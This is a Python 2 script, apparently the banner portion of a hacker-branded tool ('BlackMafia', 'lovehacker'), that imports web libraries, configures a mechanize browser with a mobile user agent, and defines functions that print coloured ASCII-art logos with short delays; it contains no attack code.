#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
def sem_1():
 time.sleep(0.01)
 print red +''
 time.sleep(0.01)
 print ""
 print ""
 print green +' _____  '+red +' _      ______      ________  '+purple +"__     ______  _    _"
 time.sleep(0.01)
 print green +'|_   _|' +red +' | |    / __ \ \    / /  ____| '+purple +"\ \   / / __ \| |  | |"
 time.sleep(0.01)
 print green + '  | |  ' +red +' | |   | |  | \ \  / /| |__    '+purple + " \ \_/ / |  | | |  | |"
 time.sleep(0.01)
 print green + '  | |  ' +red +' | |   | |  | |\ \/ / |  __|   '+purple + "  \   /| |  | | |  | |"
 time.sleep(0.01)
 print green +' _| |_  '+red +'| |___| |__| | \  /  | |____  '+purple  +  "   | | | |__| | |__| |"
 time.sleep(0.01)
 print green +'|_____| '+red +'|______\____/   \/   |______| '+purple   + "   |_|  \____/ \____/"
 time.sleep(0.01)
def sem_2():
 sem_1()
 print cyan+'''         `://-::.`                          `-++syhs` '''
 time.sleep( 0.01)
 print cyan+'''          dNNNNNNNds-                      `odNNmddmm`              '''
 time.sleep( 0.01)
 print cyan+'''          /mmmmdddmNdo-                   :hmdhhddmN+               '''
 time.sleep( 0.01)
 print cyan+'''           /Nmmdddhhho++`       ''' +red+'lovehacker'+cyan+'''     /hdhhhhhhdm-               '''
 time.sleep( 0.01)
 print cyan+'''            hmdhhhyho/s/o.              /ddhhyyyyyhm:               '''
 time.sleep( 0.01)
 print cyan+'''            omdyyyso/.-s/s.            .hhdyyyysssyho               '''
 time.sleep( 0.01)
 print cyan+'''            omdyyyys+-..o/s```..```.``.oddyyo+/:://oo`              '''
 time.sleep( 0.01)
 print cyan+'''            /mddysss+::-.+y/``..``...`.ymhhho/:.-/+s/`              '''
 time.sleep( 0.01)
 print cyan+'''            `+ddyyss/---.`sh.``-``...`.hdyyhssss+::::/++:`          '''
 time.sleep( 0.01)
 print cyan+'''          -+syyyyyyy:oo:..-y: `````..``dsyyyyhhh/--:+sdNNm:         ''' 
 time.sleep( 0.01)
 print cyan+'''        .smmdhysosyy.-:...-+y//``  ``:-mdhhhyyysoshddmmNNNN/        '''
 time.sleep( 0.01)
 print cyan+'''        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`       '''
 time.sleep( 0.01)
 print cyan+'''       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/        '''
 time.sleep( 0.01)
 print cyan+'''       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-         '''
 time.sleep( 0.01)
 print cyan+'''     ``.+mmmmddmmdysmh//-.:--.:.-....:-.---..........:+/-`          '''
 time.sleep( 0.01)
 print cyan+'''       ..-ohNNNho::://::://+////::::::::::::-----.......``       '''
 time.sleep( 0.01)
 print cyan+'''        `...---------:::::::::::::------------.......````           '''
 time.sleep( 0.01)
 print cyan+'''           `````````````...........```````````````````              '''
 time.sleep(0.01) 
def sem_3():
 sem_1()
 print cyan+'''                                       .-.              '''
 time.sleep(0.01)
 print cyan+'''                                       : `-`        '''
 time.sleep(0.01)
 print cyan+'''                                     -o. .:/-           '''                                  
 time.sleep(0.01)
 print cyan+'''                                     -o   ``:/              '''           
 time.sleep(0.01)
 print cyan+'''                                    .++      .:             '''
 time.sleep(0.01)
 print cyan+'''                                     ./       .-.               '''                          
 time.sleep(0.01)
 print cyan+'''                           '''+red+'BlackMafia'+cyan+'''     o..   .  /- -                                     '''
 time.sleep(0.01)
 print cyan+'''                        `.`..-:-`    .sh+-.`:- :`:.                                        '''
 time.sleep(0.01)
 print cyan+'''                        hshmmmdddhhdmNmooyhhh+:o/:-                         '''
 time.sleep(0.01)
 print cyan+'''                       `+smmNmNNmmmNNNdyyhddmNd+.                      '''
 time.sleep(0.01)
 print cyan+'''                         .dmmmNNmmmNNNhyyhddddh.                          '''
 time.sleep(0.01)
 print cyan+'''                         `hmmhdNmmmNNMmdssshNdy`                                           '''
 time.sleep(0.01)
 print cyan+'''                        -dyh:  .//+/sNmso+-+Ndy+                                               '''
 time.sleep(0.01)
 print cyan+'''                         s/s.        dy+s  `:::`                                             '''
 time.sleep(0.01)
 print cyan+'''                         -so/.`      h/o:                                                         '''
 time.sleep(0.01)
 print cyan+'''                         `hsoys` `   s-y/`                                                   '''
 time.sleep(0.01)
 print cyan+'''                          -hdh/`````.h:shh+`````                                             '''
 time.sleep(0.01)
 print cyan+'''                        ``.--.``````.Ndh:-.`````````````        '''
 time.sleep(0.01)
 print cyan+'''                     `````..`````````:/:.```````````````````                                '''
 time.sleep(0.01)
 print cyan+'''                `````````....````````.`..```````````````````                                  '''
 time.sleep(0.01)
 print cyan+'''               ``````````......``````-`..```````````````````````                            '''
 time.sleep(0.01)
 print cyan+'''        ``````````````````...........-...`````````````````````````````````                   '''
 time.sleep(0.01)
 print cyan+'''````````````````````````....----.....--...````````````````````````````````                      '''
 time.sleep(0.01)
 print cyan+'''````````````````````````.........-------....``````````````````````````````                     '''
 time.sleep(0.01)
 print cyan+'''``````````````````````````........------......`````````````````````````````     '''
 time.sleep(0.01)
 print cyan+'''````````````````````````````.........---.......````````````````````````````       '''
 time.sleep(0.01)
 print cyan+'''````````````````````````````....................```````````````````````````   '''
 time.sleep(0.01)
 print cyan+'''````````````````````````........................``````````````````````````` '''
 time.sleep(0.01)
 print cyan+'''................````...............................```````````````````````'''   
 time.sleep(0.01)
 print cyan+'''................................................................```````'''    
 time.sleep(0.01)
 print cyan+'''.........'''+red+'BlackMafia lovehacker Nethunter'+cyan+'''...............................''' 
 time.sleep(0.01)
 print cyan+'''........................lovehacker { '''+red+'Mafia'+cyan+''' } .............................'''         
 time.sleep(0.01)
 print cyan+'''.....................................................................      '''
 time.sleep(0.01)                              
def sem_4():
 sem_1()
 print red+'''                             `...-........`                   '''
 time.sleep(0.01)
 print red+'''                        `-:/::::--------:///-                '''
 time.sleep(0.01)
 print red+'''                      .//::::--...```.....--/o:`             '''
 time.sleep(0.01)
 print red+'''                    `:+/::::--.`         ``..:oo-            '''
 time.sleep(0.01) 
 print red+'''                   `/+////:--.`             `.-+y/           '''
 time.sleep(0.01)
 print red+'''                   :+///+/:--..`             `.:+y/          '''
 time.sleep(0.01)
 print red+'''                  -+///o+::::--...``         ``-:oy-         '''
 time.sleep(0.01)
 print red+'''                 `/+/+/oo/:-----::::-.`      ``.:+ys         '''
 time.sleep(0.01)
 print red+'''   -/....        .+o+s/o:.``  `.----//:-``````.::+yy         '''
 time.sleep(0.01)
 print red+'''   :+so:`.       .ossh++:.``     `.:--/o/:----:::+ys         '''
 time.sleep(0.01)
 print red+'''   `/so.``       `oyhdyosys+:``    .//:/soo++//::sy:         '''
 time.sleep(0.01)
 print red+'''   -o//:.`.       `ydy+/-sNdo+:.`  `.s+-/yhyyo+:ohy.         '''
 time.sleep(0.01)
 print red+'''  `///sys:```      -+++-`sd-./+o/-` `/s/-oo/::::-.:y+        '''
 time.sleep(0.01)
 print red+'''    `````:+-`.`    `:/s/.`//:/:/hy/.`-syo+-..`````/s+        '''
 time.sleep(0.01)
 print red+'''          `:+.`.`   `-/++.`-/oshdsoyyyysh/-+shmmo/-`         '''
 time.sleep(0.01)
 print red+'''            `+/`.-`  :y++s+:.`.``.:yh+yhomNNNMm/+            '''
 time.sleep(0.01)
 print red+'''              -+:`-:-s+:oh++/+++osyoyyhmsysyys-o/       .::.  '''
 time.sleep(0.01)
 print red+'''               `/o.`/+:+/ho://://+o/o+oyo+--///-       /y/.:. '''
 time.sleep(0.01)
 print red+'''                 .+/.:+s+::o++-/::/://+++o:`        `-+o:`-- '''
 time.sleep(0.01)
 print red+'''                   -o/+o++-/Nd/::.-.-:::+/    `.-::::-```.s- '''
 time.sleep(0.01)
 print red+'''                    `+ho+/:-dMNMNy:/y+/::`.-:::-```......./: '''
 time.sleep(0.01)
 print red+'''                      .o++/:/dNmmm/:++::::.``......`         '''
 time.sleep(0.01)
 print red+'''                        /++/::::++/+/-.`.--..`               '''
 time.sleep(0.01)
 print red+'''                        `+s+/+/:/+s-::--`                    '''
 time.sleep(0.01)
 print red+'''                    `.:///oyo+++//+`                         '''
 time.sleep(0.01)
 print red+'''                .-:::-..-:++---://-:`                        '''
 time.sleep(0.01)
 print red+'''           `-:::-``----.`      `:o:`--`                      '''
 time.sleep(0.01)
 print red+'''   `....-:/:-``---.`             `:+:.-.                     '''
 time.sleep(0.01)
 print red+'''  --`..-..``--.`                   `-+-.-.                   '''
 time.sleep(0.01)
 print red+''' `+/:/:```-.           '''+cyan+'Virus4'+red+'''        `:/..:-`                '''
 time.sleep(0.01)
 print red+'''    `/y- -`           '''+cyan+'AmerrDzz'+red+'''         `/+/.....-            '''
 time.sleep(0.01)
 print red+'''     `++:.                               +o```-::            '''
 time.sleep(0.01)
 print red+'''                                         `+/:/-              '''
 time.sleep(0.01)
def sem_5():
 sem_1()
 time.sleep(0.01)
 print cyan+'                          ````....````'
 time.sleep(0.01)
 print cyan+'                    `.:oyhmNMMMMMMMMNmdyo/-`'
 time.sleep(0.01)
 print cyan+'                `./ymMMMMMMNNMMMMMMMNMMMMMMNho-`'
 time.sleep(0.01)
 print cyan+'              .+hMMMMMMMMMM+ .::/:. -MMMMMMMMMMdo-`' 
 time.sleep(0.01)
 print cyan+'           `.sNMMMMMMMMMMMm          dMMMMMMMMMMMMy:`'
 time.sleep(0.01)
 print cyan+'          .oNMMMMMMMMMMMMM/          /MMMMMMMMMMMMMMy-`'
 time.sleep(0.01)
 print cyan+'        `:mMMMMMMMMMMMMMMm::::::::::::NMMMMMMMMMMMMMMN+`'
 time.sleep(0.01)
 print cyan+'       `+MMMMMMMMMMMMMMmssssssssssssssssNMMMMMMMMMMMMMMy.'
 time.sleep(0.01)
 print cyan+'      `oMMMMMMMMMMMMNy/..----:::::-----..+dMMMMMMMMMMMMMh.'
 time.sleep(0.01)
 print cyan+'     `/MMMMMMMMMMMMMMMMMs.   `-+:`   `:NMMMMMMMMMMMMMMMMMs`'
 time.sleep(0.01)
 print cyan+'     .mMMMMMMMMMMMMMMMMM+    `/ms.    .NMMMMMMMMMMMMMMMMMM:'
 time.sleep(0.01)
 print cyan+'    `+MMMMMMMMMMMMMMMMMMMdyydMMMMMmhyhNMMMMMMMMMMMMMMMMMMMh`'
 time.sleep(0.01)
 print cyan+'    `hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.'
 time.sleep(0.01) 
 print cyan+'    `mMMMMMMMMMMMMMMMMMMN+mMMMMMMMMMNsyMMMMMMMMMMMMMMMMMMMM-'
 time.sleep(0.01)
 print cyan+'    `dMMMMMMMMMMMMMMMMMMy  :hMMMMMmo` :MMMMMMMMMMMMMMMMMMMM-'
 time.sleep(0.01)
 print cyan+'    `yMMMMMMMMMMMMMMMMMM+  `oMMMMMh-  `MMMMMMMMMMMMMMMMMMMN.'
 time.sleep(0.01)
 print cyan+'     /MMMMMMMMMNdyo+/:::` oNMMMMMMMMh- :::/+oshmMMMMMMMMMMy`'
 time.sleep(0.01)
 print cyan+'     .dMMMMMMy.          :MMMN`  :MMMy          `/NMMMMMMN-'
 time.sleep(0.01)
 print cyan+'      :NMMMMN           sMMMMMh .mMMMMd.          oMMMMMMo`'
 time.sleep(0.01)
 print cyan+'      `/NMMMm           :NMMMMo  dMMMMh           +MMMMMs`'
 time.sleep(0.01)
 print cyan+'       `:NMMM`           -NMMN.  /MMMd`  `:V/     yMMMMo`'
 time.sleep(0.01)
 print cyan+'         -hMM+            .mMy    mMd`  ./+++:   `NMMm/`'
 time.sleep(0.01)
 print cyan+'          `/mm             .m.    +m`            oMNo.'
 time.sleep(0.01)
 print cyan+'            `+-             `     `.            `do.'
 time.sleep(0.01)
 print cyan+'              ```       '+green+'lovehacker '+cyan+'{'+red+'Mafia'+cyan+'}         `.`'
 time.sleep(0.01)
 print cyan+'                 ````                      ````'
 time.sleep(0.01)
 print cyan+'                    ``.:+osyhhhhhhyys+/-```'
 time.sleep(0.01)
 print cyan+'                            ```````'
 time.sleep(0.01)
def sem_6():
 sem_1()
 print cyan+"                      _____________________"
 time.sleep(0.01)
 print cyan+"                     (  "+blue+ 'love  '+cyan+ '##### '+red+ ' hacker '+cyan+" )"
 time.sleep(0.01)
 print cyan+"                  /_~~~~~~~~~~~~~~~~~~~~~~~~~_\ "
 time.sleep(0.01)
 print cyan+"                /~                             ~\ "
 time.sleep(0.01)
 print cyan+'              .~             '+green+'BlackMafia'+cyan+'             ~'
 time.sleep(0.01)
 print cyan+"          ()\/_____                           _____\/() "
 time.sleep(0.01)
 print cyan+"         .-``      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-. "      
 time.sleep(0.01)
 print '      .-~              ____'+yellow+'I Love you'+cyan+'____             ~-.'  
 time.sleep(0.01)
 print cyan+"      `~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~` "
 time.sleep(0.01)
 print cyan+'      | | |'+green+' #### #### '+cyan+'|| | | | [] | | | || '+green+'#### ####'+cyan+' | | |'  
 time.sleep(0.01)
 print cyan+"      ;__\|___________|++++++++++++++++++|___________|/__;"
 time.sleep(0.01)
 print cyan+"       (~~====___________________________________====~~~)"
 time.sleep(0.01)
 print cyan+"        \------_____________[lovehacker]__________-------/"
 time.sleep(0.01)
 print cyan+"           |      ||         ~~~~~~~~       ||      |"
 time.sleep(0.01)
 print cyan+"            \_____/                          \_____/"
 time.sleep(0.01)
def sem_7():
 sem_1()
 print ''
 time.sleep(0.01)
 print cyan+"""                     _---------."""
 time.sleep(0.01)
 print cyan+"""                 .' #######   ;." """
 time.sleep(0.01)
 print cyan+"""      .---,.    ;@             @@`;   .---,.. """
 time.sleep(0.01)
 print cyan+"""    ." @@@@@'.,'@@            @@@@@',.'@@@@ ". """
 time.sleep(0.01)
 print cyan+"""    '-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;"""
 time.sleep(0.01)
 print cyan+"""       `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'"""
 time.sleep(0.01)
 print cyan+"""         "--'.@@@  -.@        @ ,'-   .'--" """
 time.sleep(0.01)
 print cyan+"""              ".@' ; @       @ `.  ;'"""
 time.sleep(0.01)
 print cyan+"""                |@@@@ @@@     @    ."""
 time.sleep(0.01)
 print cyan+"""                 ' @@@ @@   @@    ,"""
 time.sleep(0.01)
 print cyan+"""                  `.@@@@    @@   ."""
 time.sleep(0.01)
 print cyan+"""                    ',@@     @   ;           _____________"""
 time.sleep(0.01)
 print cyan+"""                     (   3 C    )     /|___ / """+red+"Virus4 Dzz!"+cyan+""" \ """
 time.sleep(0.01)
 print cyan+"""                     ;@'. __*__,."    \|--- \_____________/ """
 time.sleep(0.01)
 print cyan+"""                      '(.,...."/ """
 time.sleep(0.01)
 print ''
def sem_8():
 sem_1()
 time.sleep(0.01)
 print cyan +'          _____________________________________________    '
 time.sleep(0.01)           
 print cyan +'         !\___________________________________________/!\ '
 time.sleep(0.01)         
 print cyan +'         !!                                           !! \ '
 time.sleep(0.01)          
 print cyan +'         !!           Welcome to { '+red+'BlackMafia'+cyan+' }           !!  \ '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!  version :  { '+red+'5.0.0'+cyan+' }                     !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!  programmer :  { '+red+'lovehacker'+cyan+' }                !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)        
 print cyan +'         !!  lovehacker :  { '+red+'BlackMafia'+cyan+' }         !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  ! '
 time.sleep(0.01)         
 print cyan +'         !!                                           !!  / '
 time.sleep(0.01)        
 print cyan +'         !!___________________________________________!! / '
 time.sleep(0.01)        
 print cyan +'         !/___________________________________________\!/ '
 time.sleep(0.01)        
 print cyan +'            __\_____________________________________/__/!_ '
 time.sleep(0.01)           
 print cyan +'           !_________________________________________!/    '       
 time.sleep(0.01)           
 print cyan +'              _____________________________________    '
 time.sleep(0.01)              
 print cyan +'            /oooo  oooo  oooo  oooo  oooo  oooo /!      '    
 time.sleep(0.01)           
 print cyan +'           /ooooooooooooooooooooooooooooooooooo/ / '
 time.sleep(0.01)           
 print cyan +'          /ooooooooooooooooooooooooooooooooooo/ / '
 time.sleep(0.01)         
 print cyan +'         /ooooooooooooooooooooooooooooooooooo/ / '
 time.sleep(0.01)        
 print cyan +'        /C=_________________________________/_/ '
 time.sleep(0.01)
def sem_9():
 sem_1()
 time.sleep(0.01)
 print red+'                        ..:::::::::..       '
 time.sleep(0.01)
 print red+'                    ..:::aad8888888baa:::..      ' 
 time.sleep(0.01)
 print red+'                .::::d:?88888888888?::8b::::.      '
 time.sleep(0.01)
 print red+'              .:::d8888:?88888888??a888888b:::.      '  
 time.sleep(0.01)
 print red+'            .:::d8888888a8888888aa8888888888b:::.      '
 time.sleep(0.01)
 print red+'           ::::dP::::::::88888888888::::::::Yb::::     '
 time.sleep(0.01)
 print red+'          ::::dP:::::::::Y888888888P:::::::::Yb::::     '
 time.sleep(0.01)
 print red+'         ::::d8:::::::::::Y8888888P:::::::::::8b::::     ' 
 time.sleep(0.01)
 print red+'        .::::88::::::::::::Y88888P::::::::::::88::::.     '
 time.sleep(0.01)
 print red+'        :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::      '
 time.sleep(0.01)
 print red+'        :::::::Y88888888888P::|::Y88888888888P:::::::     '
 time.sleep(0.01)
 print red+'        ::::::::::::::::888:::|:::888::::::::::::::::     '
 time.sleep(0.01)
 print red+"        `:::::::::::::::8888888888888b::::::::::::::'   "
 time.sleep(0.01)
 print red+'         :::::::::::::::88888888888888::::::::::::::   '
 time.sleep(0.01)
 print red+'          :::::::::::::d88888888888888:::::::::::::   '
 time.sleep(0.01)
 print red+'           ::::::::::::88::88::88:::88::::::::::::  '
 time.sleep(0.01)
 print red+"            `::::::::::88::88::88:::88::::::::::'  "
 time.sleep(0.01)
 print red+"              `::::::::88::88::P::::88::::::::'  "
 time.sleep(0.01)
 print red+"                `::::::88::88:::::::88::::::'  "
 time.sleep(0.01)
 print red+"                   ``:::::::::::::::::::''  "
 time.sleep(0.01)
 print red+"                        ``:::::::::''  "
 time.sleep(0.01)
def sem_10():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                     ,                """
 time.sleep(0.01)
 print cyan +"""                     |'.             , """
 time.sleep(0.01)
 print cyan +"""                     |  '-._        / ) """
 time.sleep(0.01)
 print cyan +"""                   .'  .._  ',     /_'-,  """
 time.sleep(0.01)
 print cyan +"""                  '   /  _'.'_\   /._)')  """
 time.sleep(0.01)
 print red +"""                 :   /  '_' '_'  /  _.' """
 time.sleep(0.01)
 print red +"""                 |E |   |Q| |Q| /   / """
 time.sleep(0.01)
 print red +"""               .'  _\  '-' '-'    / """
 time.sleep(0.01)
 print red +"""              .'--.(S     ,__` )  /    """
 time.sleep(0.01) 
 print red +"""                    '-.     _.'  /      """
 time.sleep(0.01)
 print green +"""                  __.--'----(   /   """  
 time.sleep(0.01)
 print green +"""              _.-'     :   __\ / """
 time.sleep(0.01)
 print green +"""             (      __.' :'  :Y """
 time.sleep(0.01)
 print green +"""              '.   '._,  :   :|        """
 time.sleep(0.01)
 print cyan +"""                '.     ) :.__:|      """
 time.sleep(0.01)
 print cyan +"""                  \    \______/ """
 time.sleep(0.01)
 print cyan +"""                   '._D/_Z____]    """                                       
 time.sleep(0.01)
def sem_11():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                            _...----.                """
 time.sleep(0.01)
 print cyan +"""                          .'    .-'`                """
 time.sleep(0.01)
 print cyan +"""                        ,''--..;                 """
 time.sleep(0.01)
 print cyan +"""                       /       |                  """
 time.sleep(0.01)
 print cyan +"""               _______/________|_______               """
 time.sleep(0.01)
 print cyan +"""              `-----/// _\  /_ \\\-----`                  """
 time.sleep(0.01)
 print cyan +"""                .---./ / o\/o \ \.---.                  """
 time.sleep(0.01)
 print cyan +"""               <(_ /// \__/\__/ \\\ _)>   _.---.                  """
 time.sleep(0.01)
 print cyan +"""                '-. //    oo    \\ .-'  .'   .__`\                  """
 time.sleep(0.01)
 print cyan +"""             o    /// __..--..__ \\\   /       \`\|                  """
 time.sleep(0.01)
 print cyan +"""          o-'*'-o //| '\/\/\/\/' |\\  /         ; '                  """
 time.sleep(0.01)
 print cyan +"""          \*\|/*/   ;--. """"  .-;   |   _   _  |                  """
 time.sleep(0.01)
 print cyan +"""         .-'---'-. / \|||-....(|||`\ |  (o) (o) |                  """
 time.sleep(0.01)
 print cyan +"""        /         \ /\           /\|/           |                  """
 time.sleep(0.01)
 print cyan +"""        |  .---,  |/  \         /  ;  '         |                  """
 time.sleep(0.01)
 print cyan +"""        | / e e \ |    '.     .'   |   '-.       \                  """
 time.sleep(0.01)
 print cyan +"""         \|  ^  |/       '---'     |              \_                  """
 time.sleep(0.01)
 print cyan +"""         ()._-_.()     T R I C K   |     .._.----/` \                  """
 time.sleep(0.01)
 print cyan +"""        ,/\'._.'/\. '  .           |    /   ``"-/||\ \                  """
 time.sleep(0.01)
 print cyan +"""       / \/     \/ \     O R       |   |            `7,                  """
 time.sleep(0.01)
 print cyan +"""      |  ^^_____^^  |              | . /// _          |                  """
 time.sleep(0.01)
 print cyan +"""      |oOO`     `OOo|  T R E A T   ; |' / |_) _       |                  """
 time.sleep(0.01)
 print cyan +"""      \| '._____.' |/             /  \-|  |_)/ \ _    |                  """
 time.sleep(0.01)
 print cyan +"""       |::         | '.__     __,;    `|     \_// \   |                  """
 time.sleep(0.01)
 print cyan +"""       |::         |     `````   |     |        \_/  ;                  """
 time.sleep(0.01)
 print cyan +"""       |::         |             |      \           /                  """
 time.sleep(0.01)
 print cyan +"""       \::.        /_____________|       ``'--..___/                  """
 time.sleep(0.01)
 print cyan +"""        '._______.' '-|   |   |-'                 |                  """
 time.sleep(0.01)
 print cyan +"""          |_ | _|     |   |   |               __.-;                  """
 time.sleep(0.01)
 print cyan +"""          \  |  /     /-._|_.-\                    \                  """
 time.sleep(0.01)
 print cyan +"""           \_|_/     /`'-.|.-'`\                   /                  """
 time.sleep(0.01)
 print cyan +"""     jgs  /--T--\   /    .'.    \'-..____.---''''``                  """
 time.sleep(0.01)
 print cyan +"""         (__/ \__)  \____/  \___/                  """
 time.sleep(0.01)
def sem_12():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                             __                """
 time.sleep(0.01)
 print cyan +"""                            |  |              """
 time.sleep(0.01)
 print cyan +"""                            |  |              """
 time.sleep(0.01)
 print cyan +"""                        ___/____\___              """
 time.sleep(0.01)
 print cyan +"""                   _- ~              ~  _              """
 time.sleep(0.01)
 print cyan +"""                - ~                      ~ -_              """
 time.sleep(0.01)
 print cyan +"""              -                               _              """
 time.sleep(0.01)
 print cyan +"""            -         /\            /\          _              """
 time.sleep(0.01)
 print cyan +"""           -         / *\          / *\          _              """
 time.sleep(0.01)
 print cyan +"""          _         /____\        /____\          _              """
 time.sleep(0.01)
 print cyan +"""          _                  /\                   _              """
 time.sleep(0.01)
 print cyan +"""          _                 /__\                  _              """
 time.sleep(0.01)
 print cyan +"""          _      |\                      /|       _              """
 time.sleep(0.01)
 print cyan +"""           -     \ `\/\/\/\/\/\/\/\/\/\/' /      _              """
 time.sleep(0.01)
 print cyan +"""            -     \                      /      -              """
 time.sleep(0.01)
 print cyan +"""              ~    `\/^\/^\/^\/^\/^\/^\/'      ~              """
 time.sleep(0.01)
 print cyan +"""                ~                            -~              """
 time.sleep(0.01)
 print cyan +"""                 `--_._._._._._._._._._.._--'              """
 time.sleep(0.01)
def sem_13():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                            ........              """
 time.sleep(0.01)
 print cyan +"""                            ;::;;::;,              """
 time.sleep(0.01)
 print cyan +"""                            ;::;;::;;,              """
 time.sleep(0.01)
 print cyan +"""                           ;;:::;;::;;,              """
 time.sleep(0.01)
 print cyan +"""           .vnmmnv%vnmnv%,.;;;:::;;::;;,  .,vnmnv%vnmnv,              """
 time.sleep(0.01)
 print cyan +"""        vnmmmnv%vnmmmnv%vnmmnv%;;;;;;;%nmmmnv%vnmmnv%vnmmnv              """
 time.sleep(0.01)
 print cyan +"""      vnmmnv%vnmmmmmnv%vnmmmmmnv%;:;%nmmmmmmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""     vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""    vnmmnv%vnmmmmmnv%vnmmmmmmmmnv%vnmmmmmmmmmmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""   vnmmnv%vnmmmmmnv%vnmm;mmmmmmnv%vnmmmmmmmm;mmnv%vnmmmnv%vnmmmnv,              """
 time.sleep(0.01)
 print cyan +"""  vnmmnv%vnmmmmmnv%vnmm;  mmmmmnv%vnmmmmmmm;  mmnv%vnmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +"""  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv              """
 time.sleep(0.01)
 print cyan +""" `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv'              """
 time.sleep(0.01)
 print cyan +"""  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;    mmmnv%vnmmmmnv              """
 time.sleep(0.01)
 print cyan +"""   vnmmnv%vnmmmm;;,   nmmm;,              mmmm;;     mmmnv%vnmmmmnv'              """
 time.sleep(0.01)
 print cyan +"""   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'              """
 time.sleep(0.01)
 print cyan +"""    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv'              """
 time.sleep(0.01)
 print cyan +"""      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv'              """
 time.sleep(0.01)
 print cyan +"""          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv'              """
 time.sleep(0.01)
def sem_14():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                        aa@@@@@@@@@@@@@aa              """
 time.sleep(0.01)
 print cyan +"""                     a@@@@@@@@@@@@@@@@@@@@@a              """
 time.sleep(0.01)
 print cyan +"""                   a@@@@@@@@@@@@@@@@@@@@@@@@@a              """
 time.sleep(0.01)
 print cyan +"""                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@~~~~@@@@@@@@@~~~~@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@      @@@@@@@      @@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@aaaa@@@@@@@@@aaaa@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                 `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'              """
 time.sleep(0.01)
 print cyan +"""                  @@@@@@@@~@@@~@@@~@@@~@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                   @@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
